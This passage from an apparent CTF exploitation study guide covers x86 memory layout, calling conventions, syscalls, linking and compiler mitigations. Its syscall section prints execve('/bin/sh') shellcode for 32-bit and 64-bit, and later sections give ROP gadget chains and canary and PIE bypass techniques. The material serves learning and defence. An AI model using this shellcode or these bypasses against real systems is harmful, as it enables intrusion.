- Managed by memory allocator (glibc malloc/ptmalloc2)

**Heap Inspection:**

```bash
# View heap allocations (requires pwndbg or GEF)
heap
heap chunks
heap bins

# Standard GDB heap examination
info proc mappings | grep heap
x/100gx 0x555555559000  # Examine heap memory

# Track allocations with ltrace
ltrace -e malloc+calloc+realloc+free ./binary

# valgrind for heap analysis
valgrind --leak-check=full --track-origins=yes ./binary
```

**Heap Structure (ptmalloc2):**

```
Chunk Layout:
┌─────────────────┐
│ prev_size       │ (size of previous chunk if free)
├─────────────────┤
│ size + flags    │ (A=1: non-main arena, M=1: mmap'd, P=1: prev in use)
├─────────────────┤
│ user data       │ (returned pointer from malloc)
│ ...             │
├─────────────────┤
│ fd (forward)    │ (if free: pointer to next free chunk)
├─────────────────┤
│ bk (backward)   │ (if free: pointer to prev free chunk)
└─────────────────┘
```

### Stack Segment

**Characteristics:**

- Grows downward (toward lower addresses)
- Contains function call frames
- LIFO (Last In, First Out) structure
- Read-write permissions (RW-)
- ESP/RSP points to current stack top

**Stack Frame Structure:**

```
Higher Addresses
┌──────────────────┐
│ Function args    │ (pushed right-to-left in cdecl)
├──────────────────┤
│ Return address   │ ← Saved EIP/RIP (critical for ROP)
├──────────────────┤
│ Saved EBP/RBP    │ ← Previous frame's base pointer
├──────────────────┤ ← Current EBP/RBP points here
│ Local variables  │
├──────────────────┤
│ ...              │
└──────────────────┘ ← ESP/RSP (stack pointer)
Lower Addresses
```

**Stack Inspection:**

```bash
# View stack in GDB
x/32wx $esp  # 32-bit
x/32gx $rsp  # 64-bit

# View stack frames
backtrace
# or
bt

# Detailed frame info
info frame
info args
info locals

# pwndbg/GEF stack visualization
stack
stack 50  # Show 50 stack entries
telescope $rsp 50
```

### Memory Permissions

```bash
# Check permissions
cat /proc/$PID/maps

# Example output interpretation:
# 555555554000-555555555000 r-xp  # Text (read, execute)
# 555555755000-555555756000 r--p  # Read-only data
# 555555756000-555555757000 rw-p  # Data (read, write)
# 555555757000-555555778000 rw-p  # Heap
# 7ffffffde000-7ffffffff000 rw-p  # Stack

# GDB permissions check
info proc mappings
```

### ASLR (Address Space Layout Randomization)

**Check ASLR Status:**

```bash
cat /proc/sys/kernel/randomize_va_space
# 0 = Disabled
# 1 = Conservative (stack, mmap, heap)
# 2 = Full (includes exec base)

# Temporarily disable (requires root)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Run binary without ASLR
setarch $(uname -m) -R ./binary
```

## Calling Conventions

### cdecl (C Declaration) - Linux x86 Default

**Characteristics:**

- Arguments pushed right-to-left on stack
- Caller cleans up stack
- Return value in EAX/RAX
- EBX, ESI, EDI, EBP must be preserved by callee

**Example:**

```c
int add(int a, int b, int c);
// Call: result = add(1, 2, 3);
```

**Assembly (32-bit):**

```nasm
push 3          ; arg3 (rightmost)
push 2          ; arg2
push 1          ; arg1 (leftmost)
call add
add esp, 12     ; Caller cleans stack (3 args × 4 bytes)
```

**Stack Layout Before Function:**

```
ESP → [arg1: 1]
      [arg2: 2]
      [arg3: 3]
      [return address]
```

### stdcall - Windows API Default

**Characteristics:**

- Arguments pushed right-to-left
- **Callee cleans up stack** (key difference from cdecl)
- Return value in EAX/RAX
- Function name mangled: `_function@12` (12 = bytes of args)

**Assembly (32-bit):**

```nasm
push 3
push 2
push 1
call _add@12    ; Callee cleans stack
                ; No stack adjustment needed here
```

### fastcall - Optimized Convention

**32-bit fastcall:**

- First 2 arguments in ECX and EDX
- Remaining arguments on stack (right-to-left)
- Callee cleans stack
- Name mangling: `@function@12`

**64-bit Windows fastcall (x64 calling convention):**

- First 4 integer args: RCX, RDX, R8, R9
- First 4 float args: XMM0-XMM3
- Remaining args on stack
- 32-byte shadow space reserved by caller

```nasm
; Windows x64 example: func(1, 2, 3, 4, 5)
mov rcx, 1      ; arg1
mov rdx, 2      ; arg2
mov r8, 3       ; arg3
mov r9, 4       ; arg4
push 5          ; arg5 on stack
sub rsp, 32     ; Shadow space
call func
add rsp, 40     ; Clean stack (32 shadow + 8 for arg5)
```

### System V AMD64 ABI (Linux/Unix x86-64)

**Register Usage (in order):**

1. **RDI** - First integer/pointer argument
2. **RSI** - Second argument
3. **RDX** - Third argument
4. **RCX** - Fourth argument
5. **R8** - Fifth argument
6. **R9** - Sixth argument
7. Stack - Additional arguments (right-to-left)

**Floating Point:**

- XMM0-XMM7 for first 8 float/double arguments

**Example:**

```c
long func(int a, int b, int c, int d, int e, int f, int g);
// Call: func(1, 2, 3, 4, 5, 6, 7);
```

**Assembly (64-bit Linux):**

```nasm
mov rdi, 1      ; arg1
mov rsi, 2      ; arg2
mov rdx, 3      ; arg3
mov rcx, 4      ; arg4
mov r8, 5       ; arg5
mov r9, 6       ; arg6
push 7          ; arg7 on stack
call func
add rsp, 8      ; Clean stack
```

**Preserved Registers (Callee-Saved):**

- RBX, RBP, R12-R15
- Must be restored before returning

**Scratch Registers (Caller-Saved):**

- RAX, RCX, RDX, RSI, RDI, R8-R11
- Can be modified freely by callee

### Identifying Calling Convention

```bash
# Static analysis
objdump -d ./binary | grep -A 10 '<main>'

# Look for patterns:
# - Arguments in registers → x64 or fastcall
# - Stack pushes before call → x86 (cdecl/stdcall)
# - "add esp, X" after call → cdecl (caller cleanup)
# - No stack cleanup → stdcall (callee cleanup)

# GDB runtime analysis
disassemble function_name
break function_name
run
info registers
```

## System Calls and Interrupts

### System Call Mechanisms

**x86 (32-bit) - INT 0x80:**

- Legacy interrupt-based syscall
- Syscall number in EAX
- Arguments in EBX, ECX, EDX, ESI, EDI, EBP (max 6 args)
- Return value in EAX

**Example (write syscall):**

```nasm
mov eax, 4      ; syscall number (sys_write)
mov ebx, 1      ; fd (stdout)
mov ecx, msg    ; buffer pointer
mov edx, len    ; length
int 0x80        ; invoke syscall
```

**x86-64 - SYSCALL instruction:**

- Modern, faster mechanism
- Syscall number in RAX
- Arguments in RDI, RSI, RDX, R10, R8, R9 (max 6 args)
- Return value in RAX
- **Note:** R10 used instead of RCX (RCX holds return address)

**Example (write syscall):**

```nasm
mov rax, 1      ; syscall number (sys_write)
mov rdi, 1      ; fd (stdout)
mov rsi, msg    ; buffer pointer
mov rdx, len    ; length
syscall         ; invoke syscall
```

### Common Syscall Numbers

**Linux x86 (32-bit):**

```
1   - sys_exit
2   - sys_fork
3   - sys_read
4   - sys_write
5   - sys_open
6   - sys_close
11  - sys_execve
```

**Linux x86-64:**

```
0   - sys_read
1   - sys_write
2   - sys_open
3   - sys_close
59  - sys_execve
60  - sys_exit
```

**Reference Files:**

```bash
# x86 syscalls
cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h

# x86-64 syscalls
cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h

# Or use ausyscall (part of auditd)
ausyscall --dump
ausyscall write
```

### Tracing System Calls

```bash
# Basic strace
strace ./binary

# Follow forks
strace -f ./binary

# Filter specific syscalls
strace -e trace=open,read,write ./binary

# Show timestamps
strace -t ./binary

# Count syscall frequency
strace -c ./binary

# Attach to running process
strace -p $PID

# Output to file
strace -o trace.log ./binary
```

### Debugging Syscalls in GDB

```bash
# Break on syscall instruction
catch syscall

# Break on specific syscall
catch syscall write
catch syscall 1  # By number

# View syscall info at breakpoint
info registers rax rdi rsi rdx  # Arguments

# Single-step through syscall
si  # Step into
ni  # Step over
```

### Interrupts

**Software Interrupts (x86):**

- **INT 0x80**: Linux 32-bit syscall interface
- **INT 0x3**: Breakpoint (used by debuggers)
- **INT 0x21**: DOS syscall (legacy)

**Hardware Interrupts:**

- Delivered via Interrupt Descriptor Table (IDT)
- Managed by kernel interrupt handlers
- Less relevant for userspace CTF exploitation

**Interrupt Descriptor Table (IDT):**

```bash
# View IDT (requires root)
cat /proc/interrupts

# In kernel debugging context
cat /sys/kernel/debug/x86/idt_table
```

### SYSENTER/SYSEXIT (Alternative Syscall Method)

**32-bit Fast Syscall:**

- Faster than INT 0x80
- Used by modern Linux kernels with vDSO
- Arguments same as INT 0x80
- Not directly invoked in shellcode (calls through vDSO)

**vDSO (Virtual Dynamic Shared Object):**

```bash
# Check vDSO mapping
cat /proc/self/maps | grep vdso

# In GDB
info proc mappings | grep vdso

# Disassemble vDSO syscall wrapper
gdb -batch -ex "file /lib/x86_64-linux-gnu/libc.so.6" \
    -ex "disassemble __vdso_gettimeofday"
```

### Building Syscall Shellcode

**32-bit execve("/bin/sh") example:**

```nasm
xor eax, eax    ; Zero out
push eax        ; NULL terminator
push 0x68732f2f ; "//sh"
push 0x6e69622f ; "/bin"
mov ebx, esp    ; ebx = "/bin//sh"
mov ecx, eax    ; argv = NULL
mov edx, eax    ; envp = NULL
mov al, 11      ; sys_execve
int 0x80
```

**64-bit execve("/bin/sh") example:**

```nasm
xor rax, rax
push rax        ; NULL terminator
mov rdi, 0x68732f6e69622f ; "/bin/sh"
push rdi
mov rdi, rsp    ; rdi = "/bin/sh"
xor rsi, rsi    ; argv = NULL
xor rdx, rdx    ; envp = NULL
mov al, 59      ; sys_execve
syscall
```

**Testing Shellcode:**

```bash
# Assemble
nasm -f elf32 shellcode.asm -o shellcode.o
ld -m elf_i386 shellcode.o -o shellcode

# Extract opcodes
objdump -d shellcode -M intel

# Test in Python wrapper
python3 -c 'import os; os.system("/bin/sh")' # Verify concept

# Use pwntools
python3 << EOF
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
print(shellcode.hex())
EOF
```

### Syscall Conventions Comparison Table

```
┌─────────────┬──────────────┬─────────────────────────────────────┐
│ Architecture│   Mechanism  │     Argument Registers (order)      │
├─────────────┼──────────────┼─────────────────────────────────────┤
│ x86 (32-bit)│   INT 0x80   │ EBX, ECX, EDX, ESI, EDI, EBP       │
│             │              │ Syscall# in EAX, Return in EAX     │
├─────────────┼──────────────┼─────────────────────────────────────┤
│ x86-64      │   SYSCALL    │ RDI, RSI, RDX, R10, R8, R9         │
│             │              │ Syscall# in RAX, Return in RAX     │
├─────────────┼──────────────┼─────────────────────────────────────┤
│ ARM (32-bit)│   SVC 0      │ R0, R1, R2, R3, R4, R5             │
│             │              │ Syscall# in R7, Return in R0       │
├─────────────┼──────────────┼─────────────────────────────────────┤
│ ARM64       │   SVC 0      │ X0, X1, X2, X3, X4, X5             │
│             │              │ Syscall# in X8, Return in X0       │
└─────────────┴──────────────┴─────────────────────────────────────┘
```

### Error Handling in Syscalls

**Return Values:**

- Success: Returns non-negative value (often 0 or file descriptor)
- Error: Returns -1 (x86) or -errno (x86-64)
- errno values: 1-4095 are error codes

```bash
# Trace with error details
strace -e trace=open ./binary

# Example error output:
# open("/nonexistent", O_RDONLY) = -1 ENOENT (No such file or directory)
```

**Common errno Values:**

```
EPERM (1)     - Operation not permitted
ENOENT (2)    - No such file or directory
ESRCH (3)     - No such process
EINTR (4)     - Interrupted system call
EBADF (9)     - Bad file descriptor
EACCES (13)   - Permission denied
EFAULT (14)   - Bad address
```

### Signal Handling and Interrupts

**Signals as Software Interrupts:**

- Asynchronous notifications to processes
- Can interrupt syscalls
- Handled via signal handlers or default actions

```bash
# Common signals
SIGINT (2)    - Interrupt (Ctrl+C)
SIGQUIT (3)   - Quit (Ctrl+\)
SIGILL (4)    - Illegal instruction
SIGTRAP (5)   - Breakpoint/trace trap
SIGABRT (6)   - Abort
SIGBUS (7)    - Bus error
SIGFPE (8)    - Floating point exception
SIGKILL (9)   - Kill (cannot be caught)
SIGSEGV (11)  - Segmentation fault
SIGPIPE (13)  - Broken pipe
SIGALRM (14)  - Alarm clock
SIGTERM (15)  - Termination
```

**Catching Signals in GDB:**

```bash
# Handle signals
handle SIGSEGV stop print
handle SIGINT nostop noprint

# View signal handling
info signals
info handle

# Continue after signal
continue

# Send signal to process
signal SIGINT
```

### Practical CTF Applications

**Identifying Architecture and Calling Convention:**

```bash
# File type and architecture
file ./binary
# Output: ELF 64-bit LSB executable, x86-64...

# Check if statically linked
ldd ./binary
# Output: "not a dynamic executable" = static

# Quick disassembly check
objdump -d ./binary -M intel | head -50

# Entry point
readelf -h ./binary | grep Entry
```

**Stack Frame Analysis for Buffer Overflow:**

```bash
# Set breakpoint at vulnerable function
gdb ./binary
break vulnerable_function
run

# Examine stack frame
info frame
info args
info locals

# Calculate offset to return address
x/32wx $esp  # 32-bit
x/32gx $rsp  # 64-bit

# Find saved EIP/RIP
i r ebp
x/wx $ebp+4  # 32-bit: return address at EBP+4
x/gx $rbp+8  # 64-bit: return address at RBP+8
```

**Register State Before Syscall:**

```bash
# Break before syscall
break *0x401234  # Address before syscall instruction
run

# Verify registers match calling convention
# For x64 sys_write (rax=1):
i r rax rdi rsi rdx
# Expected: rax=1, rdi=fd, rsi=buffer, rdx=count
```

**Memory Permission Verification:**

```bash
# Check if region is executable (for shellcode)
info proc mappings

# Look for RWX (read-write-execute) regions
# r-xp = readable, executable (code)
# rw-p = readable, writable (stack, heap)
# rwxp = ALL permissions (rare, NX bypass needed if absent)
```

**Heap vs Stack Address Recognition:**

```bash
# Typical 64-bit address ranges (with ASLR):
# Stack:     0x7fff........  (high addresses)
# Libraries: 0x7f..........  (high but below stack)
# Heap:      0x555.........  or 0x5625........ (low)
# Code:      0x555.........  or 0x400......... (low)

# In GDB - identify address type
i proc mappings
# Then search for address in output
```

**Calling Convention Exploitation:**

```bash
# For ROP chains, understand argument passing:

# x86 (32-bit): Arguments on stack
# ROP gadget sequence:
pop_eax_ret     # Pop syscall number into EAX
pop_ebx_ret     # Pop arg1 into EBX
pop_ecx_ret     # Pop arg2 into ECX
int_0x80        # Execute syscall

# x64: Arguments in registers
# ROP gadget sequence:
pop_rdi_ret     # Pop arg1 into RDI
pop_rsi_ret     # Pop arg2 into RSI
pop_rdx_ret     # Pop arg3 into RDX
pop_rax_ret     # Pop syscall number into RAX
syscall_ret     # Execute syscall
```

### CPU Features Relevant to Exploitation

**NX Bit (No-Execute / DEP):**

- Marks memory pages as non-executable
- Prevents shellcode execution on stack/heap
- Check status:

```bash
checksec --file=./binary
# Output shows: NX enabled/disabled

# Or with readelf
readelf -l ./binary | grep GNU_STACK
# RWE = NX disabled, RW = NX enabled
```

**Position Independent Executable (PIE):**

- Code segment loaded at random address
- Combined with ASLR for full randomization

```bash
checksec --file=./binary | grep PIE

# Check ELF type
readelf -h ./binary | grep Type
# Type: DYN = PIE enabled
# Type: EXEC = PIE disabled (fixed addresses)
```

**Stack Canaries (SSP - Stack Smashing Protection):**

- Random value placed between locals and return address
- Checked before function return

```bash
checksec --file=./binary | grep CANARY

# Identify in disassembly
objdump -d ./binary -M intel | grep fs:0x28
# mov rax, qword ptr fs:[0x28]  # Load canary
# xor rax, qword ptr fs:[0x28]  # Verify canary
```

**RELRO (Relocation Read-Only):**

- Hardens GOT (Global Offset Table)
- Partial RELRO: GOT is writable
- Full RELRO: GOT is read-only after initialization

```bash
checksec --file=./binary | grep RELRO

# Check with readelf
readelf -l ./binary | grep GNU_RELRO
```

### Advanced Register Usage Patterns

**XMM Registers (SSE/AVX):**

- XMM0-XMM15 (128-bit SIMD registers)
- YMM0-YMM15 (256-bit AVX registers)
- Used for floating point and vectorized operations
- In x64 calling convention: XMM0-XMM7 for float arguments

```bash
# View XMM registers in GDB
info all-registers
i r xmm0

# Format as different types
p/f $xmm0.v4_float  # 4 floats
p/x $xmm0.v2_int64  # 2 64-bit integers
```

**Control Registers (CR0-CR4):**

- System-level control (kernel mode)
- CR3: Page directory base (important for kernel exploits)
- Not directly accessible in userspace

**Debug Registers (DR0-DR7):**

- Hardware breakpoints
- Can be set via ptrace in userspace

```bash
# Set hardware breakpoint in GDB
hbreak *0x401234
watch *0x601040  # Watch memory location
rwatch *0x601040 # Read watchpoint
```

### Endianness Considerations

**Little-Endian (x86/x86-64 default):**

- Least significant byte at lowest address
- `0x12345678` stored as: `78 56 34 12`

```bash
# Verify in GDB
x/wx 0x601040  # Shows 0x12345678
x/4bx 0x601040 # Shows 0x78 0x56 0x34 0x12

# Python conversion
import struct
struct.pack('<I', 0x12345678)  # Little-endian
# b'x\x56\x34\x12'
```

**Big-Endian (Network byte order, some ARM systems):**

- Most significant byte at lowest address
- `0x12345678` stored as: `12 34 56 78`

### Important Memory Addresses

**Linux 64-bit Common Ranges (with ASLR):**

```
0x00400000-0x00401000   - Traditional static binary text
0x555555554000-...      - PIE executable base (randomized)
0x7ffff7000000-...      - Shared libraries (randomized)
0x7ffffffde000-...      - Stack (randomized)
```

**Linux 32-bit Common Ranges:**

```
0x08048000-...          - Text segment (static)
0xb7e00000-...          - Libraries
0xbffff000-...          - Stack top
```

**Special Addresses:**

```
NULL (0x00000000)       - Invalid pointer
0xffffffff (32-bit)     - Common fill value
0xdeadbeef              - Magic debug value
0x41414141 ('AAAA')     - Common overflow pattern
```

### CPU Instruction Categories Relevant to Exploitation

**Control Flow Instructions:**

```nasm
call addr       ; Push return address, jump to addr
ret             ; Pop return address, jump to it
jmp addr        ; Unconditional jump
je/jne/jz/jnz   ; Conditional jumps (based on flags)
```

**Stack Operations:**

```nasm
push src        ; ESP -= 4/8; [ESP] = src
pop dst         ; dst = [ESP]; ESP += 4/8
leave           ; mov esp, ebp; pop ebp (function epilogue)
enter           ; push ebp; mov ebp, esp (function prologue)
```

**Arithmetic and Logic:**

```nasm
add/sub         ; Addition/subtraction (sets flags)
xor dst, dst    ; Common zeroing idiom (faster than mov dst, 0)
inc/dec         ; Increment/decrement
cmp a, b        ; Compare (sub without storing, sets flags)
test a, b       ; Bitwise AND (sets flags, doesn't store)
```

**Data Movement:**

```nasm
mov dst, src    ; Copy data
lea dst, [src]  ; Load effective address (no memory access)
movsx/movzx     ; Move with sign/zero extension
xchg a, b       ; Exchange values
```

### Critical CTF Exploitation Points

**Function Prologue/Epilogue Recognition:**

```nasm
; Standard prologue (sets up stack frame)
push ebp
mov ebp, esp
sub esp, 0x40    ; Allocate 64 bytes for locals

; Standard epilogue (tears down frame)
leave            ; Equivalent to: mov esp, ebp; pop ebp
ret              ; Pop return address and jump
```

**Buffer Overflow Target Identification:**

```bash
# In GDB, find vulnerable strcpy/gets/scanf
disass vulnerable_function

# Look for dangerous functions
objdump -d ./binary | grep -E 'call.*<(strcpy|gets|scanf|sprintf)@plt>'

# Calculate overflow offset
pattern create 200  # pwndbg/GEF
pattern offset 0x41414141  # Find position in pattern
```

**Return Address Location:**

```bash
# 32-bit: Return address at EBP + 4
# 64-bit: Return address at RBP + 8

# In GDB at function entry
i r ebp esp
x/wx $ebp+4  # View saved return address

# Distance from buffer to return address
# = (saved EBP - buffer start) + 4/8
```

This completes the Fundamentals section covering CPU architecture, registers, memory layout, calling conventions, and system calls/interrupts.

---

# Compilation Process and Linking

## Compilation Pipeline Overview

The process of transforming source code into an executable involves multiple distinct stages. Understanding each stage is critical for exploitation because vulnerabilities can be introduced, mitigated, or exposed at different points.

### Complete Compilation Flow

```
Source Code (.c, .cpp)
         ↓
    Preprocessing
         ↓
Preprocessed Source (.i)
         ↓
     Compilation
         ↓
  Assembly Code (.s)
         ↓
     Assembling
         ↓
   Object Files (.o)
         ↓
      Linking
         ↓
Executable/Library (.elf, .so, .exe, .dll)
```

## Stage 1: Preprocessing

The preprocessor handles directives before actual compilation begins.

**Operations performed**:

- Include file expansion (`#include`)
- Macro expansion (`#define`)
- Conditional compilation (`#ifdef`, `#ifndef`)
- Comment removal
- Line continuation handling

**Manual preprocessing**:

```bash
# Generate preprocessed output
gcc -E source.c -o source.i
cpp source.c -o source.i  # Alternative using cpp directly

# View preprocessed code
cat source.i
```

**CTF Relevance**:

- Macros can hide vulnerabilities or obfuscate code
- Include paths may reveal system configuration
- Conditional compilation may enable/disable security features

**Example - Security-relevant preprocessing**:

```c
#ifdef DEBUG
    #define LOG(x) printf("DEBUG: %s\n", x)
#else
    #define LOG(x)
#endif

#ifdef DISABLE_CANARY
    #pragma GCC optimize("no-stack-protector")
#endif
```

If compiled with `-DDISABLE_CANARY`, stack canaries are disabled, creating exploitation opportunities.

## Stage 2: Compilation (Source to Assembly)

The compiler translates preprocessed source code into assembly language.

**Generate assembly output**:

```bash
# AT&T syntax (default on Linux)
gcc -S source.c -o source.s

# Intel syntax
gcc -S -masm=intel source.c -o source.s

# With optimizations
gcc -S -O2 source.c -o source.s
```

**Compiler optimization levels**:

- `-O0`: No optimization (default, preserves debugging information)
- `-O1` / `-O`: Basic optimizations
- `-O2`: Recommended optimizations (standard for releases)
- `-O3`: Aggressive optimizations (may increase code size)
- `-Os`: Optimize for size
- `-Ofast`: `-O3` plus fast math (may break IEEE compliance)

### Optimization Impact on Exploitation

**Without optimizations (`-O0`)**:

```c
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);
}
```

Assembly remains straightforward:

```asm
vulnerable:
    push   rbp
    mov    rbp, rsp
    sub    rsp, 80          ; Clear stack space
    mov    [rbp-72], rdi    ; Store input parameter
    lea    rax, [rbp-64]    ; Load buffer address
    mov    rdi, rax
    mov    rsi, [rbp-72]
    call   strcpy
    leave
    ret
```

**With optimizations (`-O2`)**:

```asm
vulnerable:
    sub    rsp, 72
    mov    rdi, rsp         ; Buffer directly on stack
    call   strcpy           ; Input parameter already in rsi
    add    rsp, 72
    ret
```

Optimizations can:

- **Remove** stack canaries if functions are inlined
- **Eliminate** unused variables (potential buffer targets)
- **Reorder** instructions (changing exploitation behavior)
- **Inline** functions (removing ROP gadgets)

**[Inference]**: The exact optimization behavior varies by compiler version and may change between GCC releases. Testing against the specific compiled binary is necessary.

## Stage 3: Assembling (Assembly to Object Code)

The assembler converts assembly language into machine code, producing object files.

```bash
# Assemble to object file
as source.s -o source.o

# Or directly from C
gcc -c source.c -o source.o

# For 32-bit on 64-bit system
gcc -m32 -c source.c -o source.o
```

**Object file contents**:

- Machine code for each function
- Symbol table (function and variable names with placeholders)
- Relocation entries (addresses to be fixed during linking)
- Debug information (if compiled with `-g`)

**Examining object files**:

```bash
# Display object file structure
readelf -a source.o

# Show symbols
nm source.o
# Output format: [address] [type] [name]
# Types: T=text, D=data, U=undefined

# Disassemble
objdump -d source.o

# View relocations
readelf -r source.o
```

**Relocation entries** indicate addresses that need fixing:

```bash
readelf -r source.o
# Example output:
# Offset     Info    Type            Sym.Value  Sym.Name
# 00000008  00000002 R_X86_64_PC32   0000000000 strcpy - 4
```

This shows that at offset 0x8 in the object file, there's a reference to `strcpy` that needs to be resolved by the linker.

## Stage 4: Linking

The linker combines object files and libraries into a final executable or library. This is where exploitation-relevant decisions about memory layout and security features are finalized.

### Static Linking

All library code is copied into the executable at link time.

```bash
# Static linking
gcc -static source.o -o binary

# Check result
file binary
# Output: ELF 64-bit LSB executable, statically linked, not stripped

ldd binary
# Output: not a dynamic executable
```

**Characteristics**:

- Large file size (includes all library code)
- No external library dependencies
- All functions resolved at link time
- No PLT/GOT mechanism needed

**CTF implications**:

- More gadgets available (entire libc included)
- No ASLR on library code
- No need for information leaks to find library functions
- Easier to find useful functions for ROP

**Finding functions in static binaries**:

```bash
# All library functions are present
nm binary | grep system
nm binary | grep execve

# Use ROPgadget for comprehensive gadget database
ROPgadget --binary binary > gadgets.txt
```

### Dynamic Linking

Library code is loaded at runtime by the dynamic linker.

```bash
# Dynamic linking (default)
gcc source.o -o binary

# Specify library paths
gcc source.o -o binary -L/custom/path -lmylib

# Check dependencies
ldd binary
# Output:
#   linux-vdso.so.1 => (0x00007ffd...)
#   libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f...)
#   /lib64/ld-linux-x86-64.so.2 (0x00007f...)
```

**Dynamic linker paths**:

- **32-bit**: `/lib/ld-linux.so.2`
- **64-bit**: `/lib64/ld-linux-x86-64.so.2`
- **ARM**: `/lib/ld-linux-armhf.so.3`

**Characteristics**:

- Small file size
- Shared library code between processes
- Functions resolved at load time (eager) or runtime (lazy)
- PLT/GOT mechanism for external functions

**Controlling dynamic linking**:

```bash
# Set library search path at runtime
LD_LIBRARY_PATH=/custom/path ./binary

# Use specific dynamic linker
/lib64/ld-linux-x86-64.so.2 --library-path /custom/path ./binary

# Preload libraries (useful for hooking functions)
LD_PRELOAD=/path/to/hook.so ./binary
```

### Lazy vs Eager Binding

**Lazy binding** (default): Functions resolved on first call.

- Faster startup time
- `.got.plt` remains writable (exploitable)

**Eager binding**: All functions resolved at load time.

```bash
# Force eager binding
LD_BIND_NOW=1 ./binary

# Or compile with -z now (Full RELRO)
gcc -Wl,-z,now source.c -o binary
```

**CTF impact**: Eager binding + Full RELRO makes `.got.plt` read-only, preventing GOT overwrites.

### Linker Scripts

Linker scripts control memory layout, section placement, and symbol definitions.

**View default linker script**:

```bash
ld --verbose
```

**Custom linker script example**:

```ld
/* custom.ld */
SECTIONS
{
    . = 0x08048000;
    .text : { *(.text) }
    . = 0x08049000;
    .data : { *(.data) }
    .bss : { *(.bss) }
}
```

```bash
# Use custom linker script
gcc -Wl,-T,custom.ld source.c -o binary
```

**CTF relevance**: Custom linker scripts can:

- Disable security features
- Place sections at predictable addresses
- Create specific memory layouts for challenges

## Compiler Security Features

Modern compilers include security mitigations that must be understood and bypassed during exploitation.

### Stack Canaries (Stack Smashing Protection)

Compiler inserts random values between local variables and return address to detect buffer overflows.

**Enable/disable**:

```bash
# Enable stack canaries (default on most systems)
gcc -fstack-protector-all source.c -o binary

# Disable stack canaries
gcc -fno-stack-protector source.c -o binary

# Variants:
# -fstack-protector-strong: Protect functions with vulnerable parameters
# -fstack-protector: Protect functions with character arrays > 8 bytes
# -fstack-protector-all: Protect all functions
```

**Generated code with canary**:

```c
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);
}
```

Assembly with `-fstack-protector-all`:

```asm
vulnerable:
    push   rbp
    mov    rbp, rsp
    sub    rsp, 80
    mov    rax, QWORD PTR fs:0x28    ; Load canary from TLS
    mov    QWORD PTR [rbp-8], rax     ; Place on stack
    xor    eax, eax
    ; ... function body ...
    mov    rax, QWORD PTR [rbp-8]     ; Load canary
    xor    rax, QWORD PTR fs:0x28     ; Compare with original
    je     .L2                         ; Jump if match
    call   __stack_chk_fail           ; Abort if mismatch
.L2:
    leave
    ret
```

**Bypassing canaries** (CTF techniques):

- Leak canary value using format string or other info leak
- Brute force canary byte-by-byte (forks preserve canary)
- Overflow into other variables without touching canary
- Use other exploitation vectors (GOT overwrite, heap exploits)

**Detecting canary presence**:

```bash
# Check for stack_chk symbols
nm binary | grep stack_chk
readelf -s binary | grep stack_chk

# In GDB
gdb binary
gdb> disas vulnerable
# Look for fs:0x28 access and __stack_chk_fail call
```

### Position Independent Executable (PIE)

PIE enables ASLR for the executable itself, not just libraries.

**Compile with/without PIE**:

```bash
# Enable PIE (default on many modern systems)
gcc -fPIE -pie source.c -o binary

# Disable PIE
gcc -no-pie source.c -o binary

# Check if PIE is enabled
file binary
# PIE: "ELF 64-bit LSB shared object" or "DYN"
# Non-PIE: "ELF 64-bit LSB executable" or "EXEC"

readelf -h binary | grep Type
# PIE: Type: DYN (Shared object file)
# Non-PIE: Type: EXEC (Executable file)
```

**Memory layout impact**:

Non-PIE:

```
.text section always at: 0x00400000 (32-bit) or 0x00400000 (64-bit)
```

PIE:

```
Base address randomized: 0x555555554000 + random_offset
```

**Exploitation impact**:

- **Without PIE**: Direct use of hardcoded addresses (gadgets, functions)
- **With PIE**: Requires information leak to defeat ASLR

**Partial PIE bypass**: Even with PIE, the last 12 bits (page offset) remain constant due to page alignment. Can brute force on 32-bit systems where address space is smaller.

### RELRO (Relocation Read-Only)

Makes the GOT read-only after relocations are applied.

**RELRO levels**:

```bash
# No RELRO
gcc -Wl,-z,norelro source.c -o binary

# Partial RELRO (default on many systems)
gcc -Wl,-z,relro source.c -o binary

# Full RELRO
gcc -Wl,-z,relro,-z,now source.c -o binary
```

**Differences**:

- **No RELRO**: Entire GOT writable, no protection
- **Partial RELRO**: `.got` read-only, `.got.plt` writable (lazy binding works)
- **Full RELRO**: Entire GOT read-only, lazy binding disabled (all functions resolved at load time)

**Check RELRO status**:

```bash
checksec --file=binary
# Or
readelf -l binary | grep GNU_RELRO
readelf -d binary | grep BIND_NOW  # Present = Full RELRO
```

**CTF impact**:

- **No/Partial RELRO**: GOT overwrite attacks possible
- **Full RELRO**: Must find alternative exploitation vectors (stack, heap, other writable sections)

### Fortify Source

Source-level protection that replaces dangerous functions with safer versions.

```bash
# Enable fortify
gcc -D_FORTIFY_SOURCE=2 -O2 source.c -o binary

# Requires -O1 or higher to work
# Level 1: Compile-time checks only
# Level 2: Runtime checks included
```

**Protected functions**:

- `strcpy` → `__strcpy_chk`
- `memcpy` → `__memcpy_chk`
- `sprintf` → `__sprintf_chk`
- `gets` → Compile error

**Example protection**:

```c
char buffer[64];
strcpy(buffer, input);  // With FORTIFY_SOURCE=2
```

Becomes:

```c
__strcpy_chk(buffer, input, 64);  // Size check at runtime
```

If `strlen(input) >= 64`, the program aborts with:

```
*** buffer overflow detected ***: ./binary terminated
```

**Detecting fortify**:

```bash
# Check for *_chk symbols
nm binary | grep _chk
readelf -s binary | grep _chk
```

**Bypassing fortify**: Exploit vulnerabilities where buffer sizes cannot be determined at compile time, or use heap-based exploits.

### Additional Compiler Flags

**NX/DEP (Non-Executable Stack)**:

```bash
# Enable NX (default)
gcc -z execstack source.c -o binary      # Disable (executable stack)
gcc -z noexecstack source.c -o binary    # Enable (non-executable)

# Check
readelf -l binary | grep GNU_STACK
# RW  = NX enabled
# RWE = NX disabled (executable stack)
```

**Control Flow Integrity (CFI)**:

```bash
# Clang CFI (requires LTO)
clang -flto -fsanitize=cfi source.c -o binary
```

**[Unverified]**: CFI implementations and effectiveness vary significantly between compiler versions. The specific protection mechanisms depend on the compiler and flags used.

**Address Sanitizer (ASan)** - Detects memory errors:

```bash
gcc -fsanitize=address source.c -o binary
```

ASan is typically used during development, not in production CTF binaries. However, if present:

- Memory bugs are caught immediately
